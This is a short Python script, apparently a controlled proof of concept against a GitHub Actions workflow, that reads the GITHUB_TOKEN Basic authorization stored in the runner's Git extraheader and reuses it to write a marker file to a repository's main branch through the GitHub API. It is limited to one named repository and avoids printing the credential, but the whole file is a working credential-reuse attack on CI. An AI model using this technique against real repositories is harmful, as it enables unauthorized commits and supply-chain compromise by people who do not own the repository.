#!/usr/bin/env python3
"""Controlled marker writer. Reads the action's temporary Git extraheader in memory only."""
import base64
import http.client
import json
import os
import subprocess
import sys

REPOSITORY = "arnodorian1337/pwnreq-choice-input-control-20261125"
MARKER_PATH = "exact-action-main-marker.txt"


def request(method: str, path: str, authorization: str, body: bytes | None = None):
    connection = http.client.HTTPSConnection("api.github.com", timeout=15)
    headers = {
        "Accept": "application/vnd.github+json",
        "Authorization": authorization,
        "User-Agent": "pwnreq-controlled-exact-action-probe",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    if body is not None:
        headers["Content-Type"] = "application/json"
    connection.request(method, path, body=body, headers=headers)
    response = connection.getresponse()
    status = response.status
    response.read()
    connection.close()
    return status


def main() -> int:
    if os.environ.get("GITHUB_REPOSITORY") != REPOSITORY:
        return 40
    try:
        extraheader = subprocess.check_output(
            ["git", "config", "--get", "http.https://github.com/.extraheader"],
            text=True,
            stderr=subprocess.DEVNULL,
        ).strip()
    except subprocess.CalledProcessError:
        return 0
    prefix = "AUTHORIZATION: basic "
    if not extraheader.startswith(prefix):
        return 41
    # Reuse the action's complete Basic authorization value in memory. Never decode,
    # print, persist, or return the credential.
    authorization = extraheader.split(":", 1)[1].strip()
    api_path = f"/repos/{REPOSITORY}/contents/{MARKER_PATH}"
    existing = request("GET", api_path + "?ref=main", authorization)
    if existing == 200:
        return 0
    if existing != 404:
        return 43
    payload = json.dumps(
        {
            "message": "controlled marker via exact credential-bearing action",
            "content": base64.b64encode(b"P\n").decode("ascii"),
            "branch": "main",
        }
    ).encode("utf-8")
    created = request("PUT", api_path, authorization, payload)
    return 0 if created in (200, 201) else 44


if __name__ == "__main__":
    sys.exit(main())
